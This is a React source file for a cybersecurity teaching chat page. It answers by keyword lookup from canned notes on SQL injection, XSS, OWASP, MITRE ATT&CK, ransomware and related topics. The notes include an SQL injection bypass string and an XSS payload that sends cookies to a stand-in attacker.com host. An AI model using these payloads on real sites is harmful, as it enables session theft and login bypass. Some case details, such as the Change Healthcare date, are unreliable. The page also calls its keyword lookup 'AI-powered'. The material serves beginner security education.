import { useState, useRef, useEffect } from "react";
import { Cpu, Send, RotateCcw } from "lucide-react";

type Message = {
  role: "user" | "assistant";
  content: string;
  timestamp: Date;
};

const knowledgeBase: Record<string, string> = {
  "sql injection": `## SQL Injection

**Definition:** A web security vulnerability that allows attackers to interfere with database queries through unsanitized user input.

**How it works:**
1. Application builds SQL query using user input: \`SELECT * FROM users WHERE name = '[INPUT]'\`
2. Attacker inputs: \`' OR '1'='1\`
3. Query becomes: \`SELECT * FROM users WHERE name = '' OR '1'='1'\`
4. Returns all rows — authentication bypassed!

**Types:**
- **In-band (Classic):** Results returned in the same channel (most common)
- **Blind SQLi:** No visible output, must infer via boolean/time-based responses
- **Out-of-band:** Data sent via different channel (DNS, HTTP)

**Prevention:**
✅ Parameterized queries / Prepared statements
✅ Input validation and sanitization
✅ Principle of least privilege for DB accounts
✅ WAF deployment
✅ Error handling (don't expose DB errors)

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application
**OWASP:** A03:2021 — Injection`,

  "xss": `## Cross-Site Scripting (XSS)

**Definition:** A client-side injection attack where malicious scripts are injected into web pages viewed by other users.

**Types:**
- **Reflected XSS:** Script is in the request, reflected in the response
- **Stored XSS:** Script is stored in the database, executes for all visitors
- **DOM-based XSS:** Occurs in client-side JavaScript

**Attack scenario:**
\`<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>\`

**Impact:** Cookie theft, session hijacking, credential phishing, defacement

**Prevention:**
✅ Output encoding (HTML entities)
✅ Content Security Policy (CSP)
✅ HTTPOnly and Secure cookie flags
✅ Input validation
✅ Modern frameworks (auto-escape by default)

**Quick memory:** XSS = script runs in victim's browser, not your server`,

  "osi model": `## OSI Model — 7 Layers

| Layer | Name | Function | Example | Attack |
|-------|------|----------|---------|--------|
| 7 | Application | User interface | HTTP, DNS | SQLi, XSS |
| 6 | Presentation | Encryption/format | SSL/TLS | SSL Strip |
| 5 | Session | Session management | NetBIOS | Session Hijack |
| 4 | Transport | End-to-end delivery | TCP, UDP | SYN Flood |
| 3 | Network | Routing | IP, ICMP | IP Spoofing |
| 2 | Data Link | Physical addressing | Ethernet | ARP Poison |
| 1 | Physical | Bits over medium | Cables | Wiretapping |

**Mnemonic (top→bottom):** All People Seem To Need Data Processing
**Mnemonic (bottom→top):** Please Do Not Throw Sausage Pizza Away

**Key security points:**
- Firewalls operate at Layer 3-4
- WAFs operate at Layer 7
- Switches at Layer 2, Routers at Layer 3`,

  "owasp": `## OWASP Top 10 (2021)

| Rank | Name | Risk |
|------|------|------|
| A01 | Broken Access Control | 🔴 Critical |
| A02 | Cryptographic Failures | 🔴 High |
| A03 | Injection (SQLi, XSS) | 🔴 High |
| A04 | Insecure Design | 🟡 High |
| A05 | Security Misconfiguration | 🟡 High |
| A06 | Vulnerable Components | 🟡 Medium |
| A07 | Authentication Failures | 🟡 High |
| A08 | Data Integrity Failures | 🟡 High |
| A09 | Logging Failures | 🟡 Medium |
| A10 | Server-Side Request Forgery | 🟡 High |

**Quick tip:** A01 (Broken Access Control) moved to #1 in 2021, replacing Injection which had held #1 for years.`,

  "mitre attack": `## MITRE ATT&CK Framework

**What it is:** A knowledge base of adversary tactics and techniques based on real-world observations.

**14 Tactics (Enterprise):**
1. Reconnaissance — Gather target info
2. Resource Development — Build attack infrastructure
3. Initial Access — Enter the network
4. Execution — Run malicious code
5. Persistence — Maintain foothold
6. Privilege Escalation — Gain higher permissions
7. Defense Evasion — Avoid detection
8. Credential Access — Steal credentials
9. Discovery — Explore environment
10. Lateral Movement — Move through network
11. Collection — Gather data
12. Command & Control — Communicate with implant
13. Exfiltration — Steal data out
14. Impact — Achieve final objective

**Use cases:**
- Red teams: map exercises to ATT&CK techniques
- Blue teams: build detections around technique IDs
- SOC: contextualize alerts with attack stage`,

  "kill chain": `## Cyber Kill Chain (Lockheed Martin)

7-phase model of a cyber attack:

1. **🔍 Reconnaissance** — Research target, identify vulnerabilities
2. **⚔️ Weaponization** — Create exploit + payload (malware, document)
3. **📧 Delivery** — Send weapon to target (email, USB, watering hole)
4. **💥 Exploitation** — Execute code on target system
5. **💾 Installation** — Install malware for persistence
6. **📡 C2 (Command & Control)** — Establish channel back to attacker
7. **🎯 Actions on Objectives** — Exfiltrate, encrypt, destroy

**Key insight:** Defenders can "break the chain" at any stage. The earlier the better!

**Comparison with MITRE ATT&CK:**
- Kill Chain: Linear, high-level phases
- ATT&CK: Detailed techniques, non-linear, more granular`,

  "ransomware": `## Ransomware

**Definition:** Malware that encrypts victim files and demands payment for the decryption key.

**Modern Evolution — Double Extortion:**
1. Exfiltrate sensitive data
2. Encrypt all files
3. Demand ransom for decryption key
4. Threaten to publish stolen data if unpaid

**Attack Lifecycle:**
Initial Access → Persistence → Lateral Movement → Data Exfiltration → Shadow Copy Deletion → Encryption → Ransom Note

**Major Groups (2026):** RansomHub, Cl0p, LockBit 4.0, Black Basta, Scattered Spider

**Famous Cases:**
- Colonial Pipeline (2021): $4.4M paid, fuel shortages
- Change Healthcare (2025): $22M paid, healthcare disrupted
- RansomHub Hospital Campaign (2026): $340M damages, 200+ hospitals hit
- WannaCry (2017): $4B in damages, NHS crippled

**Defense:**
✅ Immutable, offline backups (3-2-1 rule)
✅ EDR/XDR solutions
✅ Network segmentation
✅ Patch management
✅ Email filtering
✅ Disable unnecessary services (RDP exposure!)`,

  "phishing": `## Phishing

**Types:**
- **Phishing:** Mass email campaigns
- **Spear Phishing:** Targeted, personalized attacks
- **Whaling:** Targeting C-suite executives
- **Smishing:** SMS-based phishing
- **Vishing:** Voice call phishing

**Red flags to spot:**
- Mismatched sender domain (support@g00gle.com)
- Urgent call to action ("Your account will be suspended!")
- Generic greeting ("Dear Customer")
- Suspicious links (hover to preview URL)
- Unexpected attachments

**Tools attackers use:** GoPhish, Evilginx2, Modlishka, Zphisher

**Defense:**
✅ Security awareness training
✅ Multi-Factor Authentication (MFA) — even if credentials stolen
✅ DMARC + SPF + DKIM email authentication
✅ Anti-phishing browser extensions
✅ Email filtering and sandboxing`,

  "dns": `## DNS (Domain Name System)

**What it does:** Translates domain names → IP addresses (internet's phonebook)

**Resolution process:**
1. Browser checks local cache
2. OS checks /etc/hosts file
3. Query to Recursive Resolver (ISP/8.8.8.8)
4. Resolver → Root NS (13 sets worldwide)
5. Root → TLD NS (.com, .org, .net)
6. TLD → Authoritative NS (for that domain)
7. Auth NS returns A/AAAA record (IP)

**Key record types:**
- **A** — IPv4 address
- **AAAA** — IPv6 address
- **MX** — Mail server
- **CNAME** — Alias
- **TXT** — Verification/SPF
- **NS** — Name server

**Attacks:**
- DNS Poisoning/Spoofing — fake records in cache
- DNS Tunneling — data exfil via DNS queries
- DNS Amplification — DDoS reflection attack

**Defense:** DNSSEC, DNS-over-HTTPS (DoH), DNS filtering`,
};

function processQuery(query: string): string {
  const q = query.toLowerCase();

  for (const [key, response] of Object.entries(knowledgeBase)) {
    if (q.includes(key)) return response;
  }

  if (q.includes("cve") || q.includes("vulnerability")) {
    return `## CVE (Common Vulnerabilities and Exposures)

CVEs are unique identifiers for publicly known security vulnerabilities.

**Format:** CVE-YEAR-NUMBER (e.g., CVE-2026-1234)

**CVSS Scoring:**
- 9.0-10.0 → Critical
- 7.0-8.9 → High
- 4.0-6.9 → Medium
- 0.1-3.9 → Low

**Where to look up CVEs:**
- nvd.nist.gov (National Vulnerability Database)
- cve.mitre.org (official CVE list)
- exploit-db.com (exploits for CVEs)
- cvedetails.com (detailed CVE data)

Try asking about a specific CVE or attack technique!`;
  }

  if (q.includes("learn") || q.includes("start") || q.includes("beginner") || q.includes("roadmap")) {
    return `## Cybersecurity Learning Roadmap

**For absolute beginners (0-3 months):**
1. CompTIA A+ / Network+ concepts
2. TryHackMe Pre-Security path
3. Linux basics (OverTheWire: Bandit)
4. Python scripting basics

**Intermediate (3-12 months):**
1. TryHackMe Jr Penetration Tester
2. PortSwigger Web Security Academy
3. HackTheBox Easy machines
4. CompTIA Security+

**Advanced (12+ months):**
1. HackTheBox Pro Labs
2. eJPT → PNPT → OSCP certifications
3. Specialize: web, network, cloud, malware

**Free resources:**
- TryHackMe (free rooms)
- PortSwigger Academy (100% free)
- OWASP documentation
- MITRE ATT&CK

Check the Resources tab for a full curated list!`;
  }

  return `I can help you with cybersecurity concepts! Try asking about:

- **Attacks:** "Explain SQL injection", "What is XSS?", "How does ransomware work?"
- **Networking:** "Explain the OSI model", "How does DNS work?"
- **Frameworks:** "What is MITRE ATT&CK?", "Explain the Kill Chain", "OWASP Top 10"
- **Learning:** "How do I start learning cybersecurity?", "What certifications should I get?"
- **Defenses:** "How do I defend against phishing?", "What is a WAF?"

Type your question and I'll provide a detailed explanation with visual breakdowns!`;
}

const suggestedPrompts = [
  "Explain SQL injection like I'm a beginner",
  "How does the OSI model work?",
  "What is MITRE ATT&CK?",
  "How does ransomware attack work?",
  "What is the Cyber Kill Chain?",
  "Explain XSS vs CSRF difference",
  "How do I start learning cybersecurity?",
  "What is DNS poisoning?",
];

function MessageBubble({ msg }: { msg: Message }) {
  const isUser = msg.role === "user";

  const renderContent = (content: string) => {
    const lines = content.split("\n");
    return lines.map((line, i) => {
      if (line.startsWith("## ")) return <h2 key={i} className="text-lg font-bold mt-4 mb-2" style={{ color: '#1ba94c' }}>{line.slice(3)}</h2>;
      if (line.startsWith("**") && line.endsWith("**")) return <p key={i} className="font-semibold" style={{ color: '#1c1c1e' }}>{line.slice(2, -2)}</p>;
      if (line.startsWith("- ")) return <li key={i} className="ml-4 list-disc" style={{ color: '#374151' }}>{line.slice(2)}</li>;
      if (line.startsWith("✅ ")) return <div key={i} className="flex items-start gap-2" style={{ color: '#374151' }}><span className="text-green-500">✅</span>{line.slice(2)}</div>;
      if (line.startsWith("| ") && line.endsWith(" |")) {
        const cells = line.split("|").filter(c => c.trim());
        return (
          <tr key={i} style={{ borderBottom: '1px solid #e5e7eb' }}>
            {cells.map((cell, j) => (
              <td key={j} className="px-3 py-1.5 text-xs" style={{ color: '#374151' }}>{cell.trim()}</td>
            ))}
          </tr>
        );
      }
      if (line.startsWith("|---")) return null;
      if (line.startsWith("```")) return <div key={i} className="my-1" />;
      if (line === "") return <div key={i} className="h-2" />;
      if (/^\d+\./.test(line)) return <div key={i} className="flex items-start gap-2" style={{ color: '#374151' }}><span className="font-mono text-xs" style={{ color: '#1ba94c' }}>{line.match(/^\d+/)?.[0]}.</span>{line.replace(/^\d+\.\s*/, "")}</div>;
      return <p key={i} className="leading-relaxed" style={{ color: '#374151' }}>{line}</p>;
    });
  };

  return (
    <div className={`flex ${isUser ? "justify-end" : "justify-start"}`}>
      <div className={`max-w-3xl rounded-2xl p-4`}
        style={isUser
          ? { background: '#f0faf4', border: '1px solid #b7e4c7', color: '#1c1c1e' }
          : { background: '#ffffff', border: '1px solid #e5e7eb' }
        }
      >
        {!isUser && (
          <div className="flex items-center gap-2 mb-3 pb-2" style={{ borderBottom: '1px solid #f3f4f6' }}>
            <div className="w-6 h-6 rounded-full flex items-center justify-center" style={{ background: '#f0faf4', border: '1px solid #b7e4c7' }}>
              <Cpu className="w-3.5 h-3.5" style={{ color: '#1ba94c' }} />
            </div>
            <span className="text-xs font-medium" style={{ color: '#1ba94c' }}>CyberHub AI</span>
          </div>
        )}
        <div className="space-y-1">
          {renderContent(msg.content)}
        </div>
        <div className="text-xs mt-2" style={{ color: '#d1d5db' }} suppressHydrationWarning>
          {msg.timestamp.toLocaleTimeString()}
        </div>
      </div>
    </div>
  );
}

export default function AIAssistant() {
  const [messages, setMessages] = useState<Message[]>(() => [
    {
      role: "assistant",
      content: `Welcome to **CyberHub AI Assistant**! 🛡️

I'm your AI-powered cybersecurity guide. I can help you:

- **Explain** complex security concepts in simple terms
- **Break down** attack techniques and methodologies
- **Summarize** frameworks like MITRE ATT&CK, OWASP, Kill Chain
- **Guide** your learning path based on your goals
- **Quiz** you on cybersecurity concepts

What would you like to learn today? Try one of the suggested prompts below or ask anything!`,
      timestamp: new Date(),
    }
  ]);
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  const sendMessage = (text?: string) => {
    const query = text || input;
    if (!query.trim()) return;

    const userMsg: Message = { role: "user", content: query, timestamp: new Date() };
    setMessages(prev => [...prev, userMsg]);
    setInput("");
    setLoading(true);

    setTimeout(() => {
      const response = processQuery(query);
      const assistantMsg: Message = { role: "assistant", content: response, timestamp: new Date() };
      setMessages(prev => [...prev, assistantMsg]);
      setLoading(false);
    }, 800);
  };

  const reset = () => {
    setMessages([{
      role: "assistant",
      content: "Chat cleared! Ask me anything about cybersecurity.",
      timestamp: new Date(),
    }]);
  };

  return (
    <div className="max-w-[1100px] mx-auto h-[calc(100vh-8rem)] flex flex-col gap-4">
      <div className="flex items-center justify-between">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <Cpu className="w-5 h-5" style={{ color: '#1ba94c' }} />
            <h1 className="text-xl font-bold" style={{ color: '#1c1c1e' }}>AI Cybersecurity Assistant</h1>
          </div>
          <p className="text-sm" style={{ color: '#6b7280' }}>Ask anything — concepts, attacks, frameworks, learning paths</p>
        </div>
        <button onClick={reset} className="flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm transition-all" style={{ background: '#f7f8fa', border: '1px solid #e5e7eb', color: '#6b7280' }}>
          <RotateCcw className="w-3.5 h-3.5" /> Clear
        </button>
      </div>

      <div className="flex-1 overflow-y-auto space-y-4 pr-1">
        {messages.map((msg, i) => <MessageBubble key={i} msg={msg} />)}
        {loading && (
          <div className="flex justify-start">
            <div className="rounded-2xl p-4" style={{ background: '#ffffff', border: '1px solid #e5e7eb' }}>
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 rounded-full animate-bounce" style={{ background: '#1ba94c', animationDelay: "0ms" }} />
                <div className="w-2 h-2 rounded-full animate-bounce" style={{ background: '#1ba94c', animationDelay: "150ms" }} />
                <div className="w-2 h-2 rounded-full animate-bounce" style={{ background: '#1ba94c', animationDelay: "300ms" }} />
              </div>
            </div>
          </div>
        )}
        <div ref={messagesEndRef} />
      </div>

      <div className="flex gap-2 overflow-x-auto pb-1">
        {suggestedPrompts.map((prompt) => (
          <button
            key={prompt}
            onClick={() => sendMessage(prompt)}
            className="flex-shrink-0 px-3 py-1.5 rounded-full text-xs transition-all"
            style={{ background: '#f7f8fa', border: '1px solid #e5e7eb', color: '#6b7280' }}
          >
            {prompt}
          </button>
        ))}
      </div>

      <div className="rounded-2xl p-3 flex items-end gap-3" style={{ background: '#ffffff', border: '1px solid #e5e7eb' }}>
        <textarea
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Enter" && !e.shiftKey) {
              e.preventDefault();
              sendMessage();
            }
          }}
          placeholder="Ask about any cybersecurity concept, attack, or framework... (Enter to send)"
          rows={2}
          className="flex-1 bg-transparent text-sm outline-none resize-none leading-relaxed"
          style={{ color: '#1c1c1e' }}
        />
        <button
          onClick={() => sendMessage()}
          disabled={!input.trim() || loading}
          className="flex-shrink-0 p-3 rounded-xl transition-all disabled:opacity-40 disabled:cursor-not-allowed"
          style={{ background: '#f0faf4', border: '1px solid #b7e4c7', color: '#1ba94c' }}
        >
          <Send className="w-4 h-4" />
        </button>
      </div>
    </div>
  );
}
